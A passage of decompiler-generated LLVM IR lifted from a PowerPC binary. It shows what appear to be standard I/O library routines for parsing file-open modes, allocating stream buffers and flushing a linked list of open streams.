dec_label_pc_100054a0:                            ; preds = %dec_label_pc_10005434
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_100054a4

dec_label_pc_100054a4:                            ; preds = %dec_label_pc_10005468, %dec_label_pc_1000545c, %dec_label_pc_100054a0
  %v0_100054c4 = phi i32 [ 1089, %dec_label_pc_10005468 ], [ 577, %dec_label_pc_1000545c ], [ 1, %dec_label_pc_100054a0 ]
  %v2_100054a4 = add i32 %tmp, 1
  %v3_100054a4 = inttoptr i32 %v2_100054a4 to i8*
  %v4_100054a4 = load i8, i8* %v3_100054a4, align 1
  %v5_100054a4 = zext i8 %v4_100054a4 to i32
  store i32 %v5_100054a4, i32* %r0.global-to-local, align 4
  %v3_100054ac = icmp eq i8 %v4_100054a4, 98
  br i1 %v3_100054ac, label %dec_label_pc_100054b8, label %dec_label_pc_100054b4

dec_label_pc_100054b4:                            ; preds = %dec_label_pc_100054a4
  br label %dec_label_pc_100054b8

dec_label_pc_100054b8:                            ; preds = %dec_label_pc_100054a4, %dec_label_pc_100054b4
  %storemerge = phi i32 [ %tmp, %dec_label_pc_100054b4 ], [ %v2_100054a4, %dec_label_pc_100054a4 ]
  %v0_100054b8 = phi i32 [ %tmp, %dec_label_pc_100054b4 ], [ %v2_100054a4, %dec_label_pc_100054a4 ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_100054b8 = add i32 %v0_100054b8, 1
  %v2_100054b8 = inttoptr i32 %v1_100054b8 to i8*
  %v3_100054b8 = load i8, i8* %v2_100054b8, align 1
  %v4_100054b8 = zext i8 %v3_100054b8 to i32
  store i32 %v4_100054b8, i32* %r0.global-to-local, align 4
  %v3_100054bc = icmp eq i8 %v3_100054b8, 43
  br i1 %v3_100054bc, label %dec_label_pc_100054c4, label %dec_label_pc_100054cc

dec_label_pc_100054c4:                            ; preds = %dec_label_pc_100054b8
  store i32 %v0_100054c4, i32* %r9.global-to-local, align 4
  %v1_100054c8 = add nuw nsw i32 %v0_100054c4, 1
  store i32 %v1_100054c8, i32* @r28, align 4
  br label %dec_label_pc_100054cc

dec_label_pc_100054cc:                            ; preds = %dec_label_pc_100054b8, %dec_label_pc_100054c4
  %v3_100054cc = icmp eq i32 %v0_10005448, 0
  br i1 %v3_100054cc, label %dec_label_pc_100054d4, label %dec_label_pc_100054fc

dec_label_pc_100054d4:                            ; preds = %dec_label_pc_100054cc
  store i32 80, i32* @r3, align 4
  store i32 268457180, i32* @lr, align 4
  %v0_100054d8 = call i32 @function_100080a0()
  store i32 %v0_100054d8, i32* @r31, align 4
  %v4_100054dc = icmp eq i32 %v0_100054d8, 0
  store i1 %v4_100054dc, i1* %cr0_eq.global-to-local, align 1
  br i1 %v4_100054dc, label %dec_label_pc_100056d8, label %dec_label_pc_100054e4

dec_label_pc_100054e4:                            ; preds = %dec_label_pc_100054d4
  %v1_100054e8 = add i32 %v0_100054d8, 56
  store i32 %v1_100054e8, i32* @r3, align 4
  %v3_100054ec = inttoptr i32 %v0_100054d8 to i16*
  store i16 8192, i16* %v3_100054ec, align 2
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_100054f4 = load i32, i32* @r31, align 4
  %v2_100054f4 = add i32 %v1_100054f4, 8
  %v3_100054f4 = inttoptr i32 %v2_100054f4 to i32*
  store i32 0, i32* %v3_100054f4, align 4
  store i32 268457212, i32* @lr, align 4
  %v0_100054f8 = call i32 @function_10005764()
  %v0_100054fc.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100054fc

dec_label_pc_100054fc:                            ; preds = %dec_label_pc_100054cc, %dec_label_pc_100054e4
  %v0_1000555c = phi i32 [ %v0_1000544c, %dec_label_pc_100054cc ], [ %v0_100054fc.pre, %dec_label_pc_100054e4 ]
  %v1_100054fc = icmp slt i32 %v0_1000555c, 0
  br i1 %v1_100054fc, label %dec_label_pc_1000555c, label %dec_label_pc_10005504

dec_label_pc_10005504:                            ; preds = %dec_label_pc_100054fc
  %v1_10005508 = add i32 %arg1, 1
  store i32 %v1_10005508, i32* %r0.global-to-local, align 4
  store i32 65539, i32* %r9.global-to-local, align 4
  %v1_10005510 = load i32, i32* @r31, align 4
  %v2_10005510 = add i32 %v1_10005510, 4
  %v3_10005510 = inttoptr i32 %v2_10005510 to i32*
  store i32 %v0_1000555c, i32* %v3_10005510, align 4
  %v0_10005514 = load i32, i32* @r28, align 4
  %v1_10005514 = load i32, i32* %r9.global-to-local, align 4
  %v2_10005514 = and i32 %v1_10005514, %v0_10005514
  %v1_10005518 = add i32 %v2_10005514, 1
  store i32 %v1_10005518, i32* %r9.global-to-local, align 4
  %v1_1000551c = load i32, i32* %r0.global-to-local, align 4
  %v2_1000551c = and i32 %v1_1000551c, %v1_10005518
  store i32 %v2_1000551c, i32* %r0.global-to-local, align 4
  %v4_10005520 = icmp eq i32 %v2_1000551c, %v1_10005518
  br i1 %v4_10005520, label %dec_label_pc_10005528, label %dec_label_pc_10005474

dec_label_pc_10005528:                            ; preds = %dec_label_pc_10005504
  %v2_10005528 = sub i32 -1, %arg1
  %v3_10005528 = and i32 %v0_10005514, %v2_10005528
  store i32 %v3_10005528, i32* %r0.global-to-local, align 4
  %v1_1000552c = and i32 %v3_10005528, 1024
  store i32 %v1_1000552c, i32* %r9.global-to-local, align 4
  %v3_1000552c = icmp eq i32 %v1_1000552c, 0
  store i1 %v3_1000552c, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_1000552c, label %dec_label_pc_10005550, label %dec_label_pc_10005534

dec_label_pc_10005534:                            ; preds = %dec_label_pc_10005528
  %v0_10005534 = load i32, i32* @r29, align 4
  store i32 268457288, i32* @lr, align 4
  %v2_10005544 = call i32 @function_100095a8(i32 %v0_10005534, i32 4)
  %v3_10005548 = icmp eq i32 %v2_10005544, 0
  br i1 %v3_10005548, label %dec_label_pc_10005550, label %dec_label_pc_10005474

dec_label_pc_10005550:                            ; preds = %dec_label_pc_10005534, %dec_label_pc_10005528
  %v1_10005550 = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 15, i32 15)
  store i32 %v1_10005550, i32* %r0.global-to-local, align 4
  %v0_10005554 = load i32, i32* @r28, align 4
  %v2_10005554 = or i32 %v0_10005554, %v1_10005550
  store i32 %v2_10005554, i32* @r28, align 4
  br label %dec_label_pc_10005588

dec_label_pc_1000555c:                            ; preds = %dec_label_pc_100054fc
  %v3_1000555c = icmp eq i32 %v0_1000555c, -1
  %v0_1000556c.pre = load i32, i32* @r28, align 4
  br i1 %v3_1000555c, label %dec_label_pc_10005568, label %dec_label_pc_10005564

dec_label_pc_10005564:                            ; preds = %dec_label_pc_1000555c
  %v1_10005564 = or i32 %v0_1000556c.pre, 65536
  store i32 %v1_10005564, i32* @r28, align 4
  br label %dec_label_pc_10005568

dec_label_pc_10005568:                            ; preds = %dec_label_pc_1000555c, %dec_label_pc_10005564
  %v0_1000556c = phi i32 [ %v1_10005564, %dec_label_pc_10005564 ], [ %v0_1000556c.pre, %dec_label_pc_1000555c ]
  store i32 438, i32* @r5, align 4
  store i32 268457340, i32* @lr, align 4
  %v2_10005578 = call i32 @function_100098c4(i32 %arg1, i32 %v0_1000556c)
  %v1_1000557c = icmp slt i32 %v2_10005578, 0
  %v1_10005580 = load i32, i32* @r31, align 4
  %v2_10005580 = add i32 %v1_10005580, 4
  %v3_10005580 = inttoptr i32 %v2_10005580 to i32*
  store i32 %v2_10005578, i32* %v3_10005580, align 4
  br i1 %v1_1000557c, label %dec_label_pc_10005488, label %dec_label_pc_10005568.dec_label_pc_10005588_crit_edge

dec_label_pc_10005568.dec_label_pc_10005588_crit_edge: ; preds = %dec_label_pc_10005568
  %v0_1000558c.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10005588

dec_label_pc_10005588:                            ; preds = %dec_label_pc_10005568.dec_label_pc_10005588_crit_edge, %dec_label_pc_10005550
  %v0_1000558c = phi i32 [ %v0_1000558c.pre, %dec_label_pc_10005568.dec_label_pc_10005588_crit_edge ], [ %v2_10005554, %dec_label_pc_10005550 ]
  %v0_10005588 = load i32, i32* @r31, align 4
  %v1_10005588 = inttoptr i32 %v0_10005588 to i16*
  %v2_10005588 = load i16, i16* %v1_10005588, align 2
  %v3_10005588 = zext i16 %v2_10005588 to i32
  store i32 %v3_10005588, i32* %r0.global-to-local, align 4
  %v1_1000558c = urem i32 %v0_1000558c, 4
  store i32 %v1_1000558c, i32* %r29.global-to-local, align 4
  %v1_10005590 = call i32 @__asm_rlwinm(i32 %v0_1000558c, i32 0, i32 21, i32 21)
  %v1_10005594 = add nuw nsw i32 %v1_1000558c, 1
  store i32 %v1_10005594, i32* %r29.global-to-local, align 4
  %v1_10005598 = call i32 @__asm_rlwinm(i32 %v3_10005588, i32 0, i32 18, i32 18)
  store i32 %v1_10005598, i32* %r0.global-to-local, align 4
  %v1_1000559c = xor i32 %v1_10005594, 3
  store i32 %v1_1000559c, i32* %r29.global-to-local, align 4
  %v1_100055a0 = urem i32 %v1_10005598, 65536
  store i32 %v1_100055a0, i32* %r9.global-to-local, align 4
  %v0_100055a4 = load i32, i32* @r28, align 4
  %v1_100055a4 = call i32 @__asm_rlwinm(i32 %v0_100055a4, i32 31, i32 16, i32 16)
  %v2_100055a8 = or i32 %v1_100055a4, %v1_10005590
  store i32 %v2_100055a8, i32* %r0.global-to-local, align 4
  %v0_100055ac = load i32, i32* %r29.global-to-local, align 4
  %v1_100055ac = mul i32 %v0_100055ac, 16
  %v0_100055b0 = load i32, i32* %r9.global-to-local, align 4
  %v2_100055b0 = or i32 %v0_100055b0, %v2_100055a8
  store i32 %v2_100055b0, i32* %r9.global-to-local, align 4
  %v2_100055b4 = or i32 %v2_100055b0, %v1_100055ac
  store i32 %v2_100055b4, i32* @r29, align 4
  %v1_100055b8 = trunc i32 %v2_100055b4 to i16
  %v2_100055b8 = load i32, i32* @r31, align 4
  %v3_100055b8 = inttoptr i32 %v2_100055b8 to i16*
  store i16 %v1_100055b8, i16* %v3_100055b8, align 2
  %v0_100055bc = call i32 @function_10004e38()
  store i32 %v0_100055bc, i32* @r28, align 4
  %v0_100055c4 = load i32, i32* @r31, align 4
  %v1_100055c4 = add i32 %v0_100055c4, 4
  %v2_100055c4 = inttoptr i32 %v1_100055c4 to i32*
  %v3_100055c4 = load i32, i32* %v2_100055c4, align 4
  %v1_100055c8 = inttoptr i32 %v0_100055bc to i32*
  %v2_100055c8 = load i32, i32* %v1_100055c8, align 4
  store i32 %v2_100055c8, i32* @r27, align 4
  store i32 268457424, i32* @lr, align 4
  %v1_100055cc = call i32 @function_100077bc(i32 %v3_100055c4)
  %v1_100055d0 = mul i32 %v1_100055cc, 256
  %v0_100055d4 = load i32, i32* @r29, align 4
  %v2_100055d4 = or i32 %v0_100055d4, %v1_100055d0
  store i32 %v2_100055d4, i32* @r29, align 4
  %v1_100055d8 = trunc i32 %v2_100055d4 to i16
  %v2_100055d8 = load i32, i32* @r31, align 4
  %v3_100055d8 = inttoptr i32 %v2_100055d8 to i16*
  store i16 %v1_100055d8, i16* %v3_100055d8, align 2
  %v0_100055dc = load i32, i32* @r27, align 4
  %v1_100055dc = load i32, i32* @r28, align 4
  %v2_100055dc = inttoptr i32 %v1_100055dc to i32*
  store i32 %v0_100055dc, i32* %v2_100055dc, align 4
  %v0_100055e0 = load i32, i32* @r31, align 4
  %v1_100055e0 = add i32 %v0_100055e0, 8
  %v2_100055e0 = inttoptr i32 %v1_100055e0 to i32*
  %v3_100055e0 = load i32, i32* %v2_100055e0, align 4
  store i32 %v3_100055e0, i32* %r0.global-to-local, align 4
  %v3_100055e4 = icmp eq i32 %v3_100055e0, 0
  br i1 %v3_100055e4, label %dec_label_pc_100055ec, label %dec_label_pc_1000561c

dec_label_pc_100055ec:                            ; preds = %dec_label_pc_10005588
  store i32 4096, i32* @r3, align 4
  store i32 268457460, i32* @lr, align 4
  %v0_100055f0 = call i32 @function_100080a0()
  %v3_100055f4 = icmp eq i32 %v0_100055f0, 0
  %v1_100055f8 = load i32, i32* @r31, align 4
  %v2_100055f8 = add i32 %v1_100055f8, 8
  %v3_100055f8 = inttoptr i32 %v2_100055f8 to i32*
  store i32 %v0_100055f0, i32* %v3_100055f8, align 4
  %v1_10005618 = load i32, i32* @r31, align 4
  br i1 %v3_100055f4, label %dec_label_pc_10005618, label %dec_label_pc_10005600

dec_label_pc_10005600:                            ; preds = %dec_label_pc_100055ec
  %v1_10005600 = inttoptr i32 %v1_10005618 to i16*
  %v2_10005600 = load i16, i16* %v1_10005600, align 2
  %v3_10005600 = zext i16 %v2_10005600 to i32
  store i32 %v3_10005600, i32* %r0.global-to-local, align 4
  %v1_10005604 = add i32 %v0_100055f0, 4096
  store i32 %v1_10005604, i32* %r9.global-to-local, align 4
  %v2_10005608 = add i32 %v1_10005618, 12
  %v3_10005608 = inttoptr i32 %v2_10005608 to i32*
  store i32 %v1_10005604, i32* %v3_10005608, align 4
  %v0_1000560c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000560c = or i32 %v0_1000560c, 16384
  store i32 %v1_1000560c, i32* %r0.global-to-local, align 4
  %v1_10005610 = trunc i32 %v1_1000560c to i16
  %v2_10005610 = load i32, i32* @r31, align 4
  %v3_10005610 = inttoptr i32 %v2_10005610 to i16*
  store i16 %v1_10005610, i16* %v3_10005610, align 2
  br label %dec_label_pc_1000561c

dec_label_pc_10005618:                            ; preds = %dec_label_pc_100055ec
  %v2_10005618 = add i32 %v1_10005618, 12
  %v3_10005618 = inttoptr i32 %v2_10005618 to i32*
  store i32 0, i32* %v3_10005618, align 4
  br label %dec_label_pc_1000561c

dec_label_pc_1000561c:                            ; preds = %dec_label_pc_10005588, %dec_label_pc_10005600, %dec_label_pc_10005618
  %v0_1000561c = load i32, i32* @r31, align 4
  %v1_1000561c = inttoptr i32 %v0_1000561c to i16*
  %v2_1000561c = load i16, i16* %v1_1000561c, align 2
  %v3_1000561c = zext i16 %v2_1000561c to i32
  store i32 %v3_1000561c, i32* %r0.global-to-local, align 4
  %v1_10005620 = add i32 %v0_1000561c, 8
  %v2_10005620 = inttoptr i32 %v1_10005620 to i32*
  %v3_10005620 = load i32, i32* %v2_10005620, align 4
  store i32 %v3_10005620, i32* %r9.global-to-local, align 4
  %v1_10005624 = and i32 %v3_1000561c, 8192
  %v3_10005624 = icmp eq i32 %v1_10005624, 0
  store i1 %v3_10005624, i1* %cr0_eq.global-to-local, align 1
  %v3_1000562c = add i32 %v0_1000561c, 2
  %v4_1000562c = inttoptr i32 %v3_1000562c to i8*
  store i8 0, i8* %v4_1000562c, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10005634 = load i32, i32* %r9.global-to-local, align 4
  %v1_10005634 = load i32, i32* @r31, align 4
  %v2_10005634 = add i32 %v1_10005634, 20
  %v3_10005634 = inttoptr i32 %v2_10005634 to i32*
  store i32 %v0_10005634, i32* %v3_10005634, align 4
  %v0_10005638 = load i32, i32* %r9.global-to-local, align 4
  %v1_10005638 = load i32, i32* @r31, align 4
  %v2_10005638 = add i32 %v1_10005638, 24
  %v3_10005638 = inttoptr i32 %v2_10005638 to i32*
  store i32 %v0_10005638, i32* %v3_10005638, align 4
  %v0_1000563c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000563c = load i32, i32* @r31, align 4
  %v2_1000563c = add i32 %v1_1000563c, 28
  %v3_1000563c = inttoptr i32 %v2_1000563c to i32*
  store i32 %v0_1000563c, i32* %v3_1000563c, align 4
  %v0_10005640 = load i32, i32* %r9.global-to-local, align 4
  %v1_10005640 = load i32, i32* @r31, align 4
  %v2_10005640 = add i32 %v1_10005640, 16
  %v3_10005640 = inttoptr i32 %v2_10005640 to i32*
  store i32 %v0_10005640, i32* %v3_10005640, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v0_10005648 = load i32, i32* %r0.global-to-local, align 4
  %v1_10005648 = load i32, i32* @r31, align 4
  %v2_10005648 = add i32 %v1_10005648, 44
  %v3_10005648 = inttoptr i32 %v2_10005648 to i32*
  store i32 %v0_10005648, i32* %v3_10005648, align 4
  %v3_1000564c = load i32, i32* @global_var_1001043c.225, align 4
  store i32 %v3_1000564c, i32* %r0.global-to-local, align 4
  %v1_10005650 = load i32, i32* @r31, align 4
  %v2_10005650 = add i32 %v1_10005650, 52
  %v3_10005650 = inttoptr i32 %v2_10005650 to i32*
  store i32 %v3_1000564c, i32* %v3_10005650, align 4
  %v0_10005654 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_10005654, label %dec_label_pc_100056d8, label %dec_label_pc_10005658

dec_label_pc_10005658:                            ; preds = %dec_label_pc_1000561c
  store i32 ptrtoint ([3 x i8]* @global_var_100091f8.205 to i32), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_100100fc.206 to i32), i32* %r29.global-to-local, align 4
  %v2_10005668 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10005668, i32* @r26, align 4
  store i32 %v2_10005668, i32* @r3, align 4
  %v0_10005678 = call i32 @function_10009200()
  %v2_10005684 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10005684, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_100100e4.226 to i32), i32* @r29, align 4
  %v0_1000568c = call i32 @function_100091f8()
  store i32 %v2_10005684, i32* @r3, align 4
  %v0_1000569c = call i32 @function_10009200()
  %v0_100056a4 = call i32 @function_100091f8()
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v3_100056ac = load i32, i32* bitcast (i32** @global_var_10010438.227 to i32*), align 4
  store i32 %v3_100056ac, i32* %r0.global-to-local, align 4
  store i32 %v2_10005684, i32* @r3, align 4
  %v1_100056b8 = load i32, i32* @r31, align 4
  %v2_100056b8 = add i32 %v1_100056b8, 32
  %v3_100056b8 = inttoptr i32 %v2_100056b8 to i32*
  store i32 %v3_100056ac, i32* %v3_100056b8, align 4
  %v0_100056bc = load i32, i32* @r31, align 4
  store i32 %v0_100056bc, i32* bitcast (i32** @global_var_10010438.227 to i32*), align 4
  %v0_100056c0 = call i32 @function_10009200()
  store i32 %v2_10005668, i32* @r3, align 4
  %v0_100056cc = call i32 @function_10009200()
  br label %dec_label_pc_100056d8

dec_label_pc_100056d4:                            ; preds = %dec_label_pc_10005488, %dec_label_pc_10005474, %dec_label_pc_10005494
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_100056d8

dec_label_pc_100056d8:                            ; preds = %dec_label_pc_1000561c, %dec_label_pc_100054d4, %dec_label_pc_10005658, %dec_label_pc_100056d4
  store i32 %v0_10005434, i32* %r0.global-to-local, align 4
  %v0_100056dc = load i32, i32* @r31, align 4
  ret i32 %v0_100056dc

; uselistorder directives
  uselistorder i32 %v1_10005618, { 2, 0, 1 }
  uselistorder i32 %v0_1000558c, { 1, 0 }
  uselistorder i32 %v0_100054d8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_100054c4, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17 }
  uselistorder i8 114, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_100056d8, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_100056d4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000561c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10005568, { 1, 0 }
  uselistorder label %dec_label_pc_100054fc, { 1, 0 }
  uselistorder label %dec_label_pc_100054cc, { 1, 0 }
  uselistorder label %dec_label_pc_100054b8, { 1, 0 }
  uselistorder label %dec_label_pc_100054a4, { 2, 0, 1 }
}

define i32 @function_100056f0(i32 %arg1) local_unnamed_addr {
dec_label_pc_100056f0:
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* @r28, align 4
  %v0_10005704 = call i32 @function_10004e38()
  store i32 %v0_10005704, i32* @r26, align 4
  %v1_10005710 = inttoptr i32 %v0_10005704 to i32*
  %v2_10005710 = load i32, i32* %v1_10005710, align 4
  store i32 %v2_10005710, i32* @r25, align 4
  store i32 ptrtoint (i16* @global_var_10010114.201 to i32), i32* @r27, align 4
  %v3_10005718 = load i16, i16* @global_var_10010114.201, align 2
  %v4_10005718 = zext i16 %v3_10005718 to i32
  store i32 %v4_10005718, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10005720.229 to i32), i32* @lr, align 4
  %v1_1000571c = call i32 @function_100077bc(i32 0)
  %v1_10005720 = sub i32 1, %v1_1000571c
  %v1_10005724 = mul i32 %v1_10005720, 256
  %v0_10005728 = load i32, i32* @r29, align 4
  %v2_10005728 = xor i32 %v1_10005724, %v0_10005728
  %v1_10005730 = trunc i32 %v2_10005728 to i16
  store i16 %v1_10005730, i16* @global_var_10010114.201, align 2
  %v3_10005734 = load i16, i16* @global_var_10010164.202, align 2
  %v4_10005734 = zext i16 %v3_10005734 to i32
  store i32 %v4_10005734, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000573c.230 to i32), i32* @lr, align 4
  %v1_10005738 = call i32 @function_100077bc(i32 1)
  %v1_1000573c = sub i32 1, %v1_10005738
  %v1_10005740 = mul i32 %v1_1000573c, 256
  %v0_10005744 = load i32, i32* @r29, align 4
  %v2_10005744 = xor i32 %v1_10005740, %v0_10005744
  %v1_10005748 = trunc i32 %v2_10005744 to i16
  store i16 %v1_10005748, i16* @global_var_10010164.202, align 2
  %v0_1000574c = load i32, i32* @r25, align 4
  %v1_1000574c = load i32, i32* @r26, align 4
  %v2_1000574c = inttoptr i32 %v1_1000574c to i32*
  store i32 %v0_1000574c, i32* %v2_1000574c, align 4
  ret i32 %v1_10005740

; uselistorder directives
  uselistorder i32 %v1_10005740, { 1, 0 }
  uselistorder i16* @global_var_10010164.202, { 1, 0 }
}

define i32 @function_10005764() local_unnamed_addr {
dec_label_pc_10005764:
  store i32 24, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1000e5b0.231 to i32), i32* @r4, align 4
  %v0_10005770 = call i32 @function_10007108()
  ret i32 %v0_10005770
}

define i32 @function_10005774(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10005774:
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_100100e4.226 to i32), i32* @r3, align 4
  store i32 268457872, i32* @lr, align 4
  %v0_1000578c = call i32 @function_10005764()
  store i32 ptrtoint (i32* @global_var_100100fc.206 to i32), i32* @r3, align 4
  store i32 268457884, i32* @lr, align 4
  %v0_10005798 = call i32 @function_10005764()
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %storemerge6 = load i32, i32* bitcast (i32** @global_var_10010438.227 to i32*), align 4
  store i32 %storemerge6, i32* %r31.global-to-local, align 4
  %v3_100057e49 = icmp eq i32 %storemerge6, 0
  %v1_100057e811 = add i32 %storemerge6, 56
  store i32 %v1_100057e811, i32* %r30.global-to-local, align 4
  br i1 %v3_100057e49, label %dec_label_pc_100057f4, label %dec_label_pc_100057a8

dec_label_pc_100057a8:                            ; preds = %dec_label_pc_10005774, %dec_label_pc_100057d4
  %v0_100057a8 = call i32 @function_100091f8()
  %v3_100057ac = icmp eq i32 %v0_100057a8, 0
  %v0_100057b0 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_100057b0, i32* @r3, align 4
  br i1 %v3_100057ac, label %dec_label_pc_100057d4, label %dec_label_pc_100057b8

dec_label_pc_100057b8:                            ; preds = %dec_label_pc_100057a8
  %v0_100057b8 = load i32, i32* %r31.global-to-local, align 4
  %v1_100057b8 = add i32 %v0_100057b8, 8
  %v2_100057b8 = inttoptr i32 %v1_100057b8 to i32*
  %v3_100057b8 = load i32, i32* %v2_100057b8, align 4
  store i32 %v3_100057b8, i32* %r9.global-to-local, align 4
  %v3_100057c0 = inttoptr i32 %v0_100057b8 to i16*
  store i16 48, i16* %v3_100057c0, align 2
  %v0_100057c4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100057c4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100057c4 = add i32 %v1_100057c4, 20
  %v3_100057c4 = inttoptr i32 %v2_100057c4 to i32*
  store i32 %v0_100057c4, i32* %v3_100057c4, align 4
  %v0_100057c8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100057c8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100057c8 = add i32 %v1_100057c8, 24
  %v3_100057c8 = inttoptr i32 %v2_100057c8 to i32*
  store i32 %v0_100057c8, i32* %v3_100057c8, align 4
  %v0_100057cc = load i32, i32* %r9.global-to-local, align 4
  %v1_100057cc = load i32, i32* %r31.global-to-local, align 4
  %v2_100057cc = add i32 %v1_100057cc, 28
  %v3_100057cc = inttoptr i32 %v2_100057cc to i32*
  store i32 %v0_100057cc, i32* %v3_100057cc, align 4
  %v0_100057d0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100057d0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100057d0 = add i32 %v1_100057d0, 16
  %v3_100057d0 = inttoptr i32 %v2_100057d0 to i32*
  store i32 %v0_100057d0, i32* %v3_100057d0, align 4
  br label %dec_label_pc_100057d4

dec_label_pc_100057d4:                            ; preds = %dec_label_pc_100057a8, %dec_label_pc_100057b8
  %v1_100057d8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100057d8 = add i32 %v1_100057d8, 52
  %v3_100057d8 = inttoptr i32 %v2_100057d8 to i32*
  store i32 1, i32* %v3_100057d8, align 4
  store i32 268457952, i32* @lr, align 4
  %v0_100057dc = call i32 @function_10005764()
  %v0_100057e0 = load i32, i32* %r31.global-to-local, align 4
  %v1_100057e0 = add i32 %v0_100057e0, 32
  %v2_100057e0 = inttoptr i32 %v1_100057e0 to i32*
  %storemerge = load i32, i32* %v2_100057e0, align 4
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  %v3_100057e4 = icmp eq i32 %storemerge, 0
  %v1_100057e8 = add i32 %storemerge, 56
  store i32 %v1_100057e8, i32* %r30.global-to-local, align 4
  br i1 %v3_100057e4, label %dec_label_pc_100057e4.dec_label_pc_100057f4_crit_edge, label %dec_label_pc_100057a8

dec_label_pc_100057e4.dec_label_pc_100057f4_crit_edge: ; preds = %dec_label_pc_100057d4
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_10010438.227 to i32*), align 4
  br label %dec_label_pc_100057f4

dec_label_pc_100057f4:                            ; preds = %dec_label_pc_100057e4.dec_label_pc_100057f4_crit_edge, %dec_label_pc_10005774
  %v0_1000583016 = phi i32 [ %v1_100057e8, %dec_label_pc_100057e4.dec_label_pc_100057f4_crit_edge ], [ %v1_100057e811, %dec_label_pc_10005774 ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_100057e4.dec_label_pc_100057f4_crit_edge ], [ 0, %dec_label_pc_10005774 ]
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  store i32 %storemerge12, i32* @r31, align 4
  %v3_100058185 = icmp eq i32 %storemerge12, 0
  br i1 %v3_100058185, label %dec_label_pc_10005820, label %dec_label_pc_10005800

dec_label_pc_10005800:                            ; preds = %dec_label_pc_100057f4, %dec_label_pc_10005814
  %v0_10005800 = phi i32 [ %storemerge1, %dec_label_pc_10005814 ], [ %storemerge12, %dec_label_pc_100057f4 ]
  %v1_10005800 = inttoptr i32 %v0_10005800 to i16*
  %v2_10005800 = load i16, i16* %v1_10005800, align 2
  %v3_10005800 = zext i16 %v2_10005800 to i32
  store i32 %v0_10005800, i32* @r3, align 4
  %v1_10005808 = and i32 %v3_10005800, 64
  store i32 %v1_10005808, i32* %r9.global-to-local, align 4
  %v3_10005808 = icmp eq i32 %v1_10005808, 0
  br i1 %v3_10005808, label %dec_label_pc_10005814, label %dec_label_pc_10005810

dec_label_pc_10005810:                            ; preds = %dec_label_pc_10005800
  store i32 268458004, i32* @lr, align 4
  %v0_10005810 = call i32 @function_10005834()
  %v0_10005814.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10005814

dec_label_pc_10005814:                            ; preds = %dec_label_pc_10005800, %dec_label_pc_10005810
  %v0_10005814 = phi i32 [ %v0_10005800, %dec_label_pc_10005800 ], [ %v0_10005814.pre, %dec_label_pc_10005810 ]
  %v0_1000583017 = phi i32 [ %v0_10005800, %dec_label_pc_10005800 ], [ %v0_10005810, %dec_label_pc_10005810 ]
  %v1_10005814 = add i32 %v0_10005814, 32
  %v2_10005814 = inttoptr i32 %v1_10005814 to i32*
  %storemerge1 = load i32, i32* %v2_10005814, align 4
  store i32 %storemerge1, i32* @r31, align 4
  %v3_10005818 = icmp eq i32 %storemerge1, 0
  br i1 %v3_10005818, label %dec_label_pc_10005820, label %dec_label_pc_10005800

dec_label_pc_10005820:                            ; preds = %dec_label_pc_10005814, %dec_label_pc_100057f4
  %v0_10005830 = phi i32 [ %v0_1000583016, %dec_label_pc_100057f4 ], [ %v0_1000583017, %dec_label_pc_10005814 ]
  ret i32 %v0_10005830

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %v0_10005800, { 0, 1, 3, 2 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32* %r31.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r30.global-to-local, { 2, 1, 0 }
  uselistorder i32 ()* @function_10005764, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_10005814, { 1, 0 }
